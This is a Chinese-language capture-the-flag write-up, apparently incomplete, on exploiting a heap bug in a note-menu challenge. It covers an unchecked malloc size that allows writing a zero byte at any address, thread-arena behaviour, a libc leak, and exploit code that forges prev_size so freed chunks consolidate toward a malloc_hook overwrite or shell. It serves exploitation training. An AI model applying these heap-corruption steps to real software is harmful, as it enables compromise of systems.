# 零碎的知识点
### 1.main_arena 与 t_arena
malloc一个很当的空间时，int_malloc会返回null<br>
从而去调用arena_get_retry分配新的arena，再次尝试去分配内存，当然最后分配也是失败的<br>
一旦分配了新的arena，之后的堆操作会使用这个arena进行操作，可以参考arena_get函数<br>
新的arena的查看，p &main_arena->next 就可以找到新的arena的地址，进行查看
![t_arena](img/t_arena.png)<br>

# 题目分析
menu题目<br>
![menu](img/menu.PNG)<br>
### 漏洞点
漏洞点在new_note的malloc地方，malloc的size没有被限制，也没有校验malloc的返回值<br>
导致`*((_BYTE *)qword_202050[v1] + size - 1) = 0;`，任意地址写0<br>
![vuln](img/vuln.PNG)<br>


## 总体思路
1.chunk块在free和malloc的时候没有对立面的内容进行清空，所以很容易可以泄露出main_arena的地址,进而获取libc的基址<br>
2.由于要使用任意地址写0这个操作，必定要malloc(big_size)，后续的操作都会在t_arena上进行。所以先将chunk移到t_arena上，然后泄露t_arena的基址<br>
3.这个题目，总共找到了五种解题方法（getshell或者成功写malloc_hook视为解题成功）<br>
3.1.这个题目一共只能申请三个chunk，使用chunka、chunkb、chunkc代替。思路为使用chunkb修改chunkc的pre_size，pre_size覆盖chunka,chunkb。然后将chunkc(freeed)的inuse位写0,free(chunkc)达到conslidate(chunka+chunkb+chunkc)的目的，此时chunk







## 具体利用
### 1+2.前面的利用基址就不详细说了
### 3.1.free(chunkc) && conslidate(chunka+chunkb+chunkc)
使用chunkb去写chunkc的pre_size,chunkd防止top chunk和chunkc合并了，此时chunka和chunkc都挂在unsortedbin上。
```
  new(0,0x98,'A'*0x97)
  new(1,0x68,'B'*0x60+p64(0x140))
  new(2,0xf0,'C'*0xef)

  #like off-by-one-null
  delete(1)
  new(1,0x30,'D'*0x30)
  delete(2)
  delete(0)
  new(2,0x68,'B'*0x67)
```
![3.1.1](img/3.1.1.PNG)<br>
chunkc在in use的情况下，size的值是105，因为是mmap分配的，free的情况下是101,此时将chunkc(freed)的in use位写0<br>
将chunkc malloc回来，然后在free，触发consolidate，在0x7ffff00008b0的地方有一个size=0x241大小的chunk挂在unsortedbin上<br>
之后申请都会先从这个chunk里面切割，last chunk。
```
  new(0,heap_addr-0x78+0x9f8+1,'')
  new(0,0xf0,'C'*0xef)
  delete(0)
```
![3.1.2](img/3.1.2.PNG)<br>


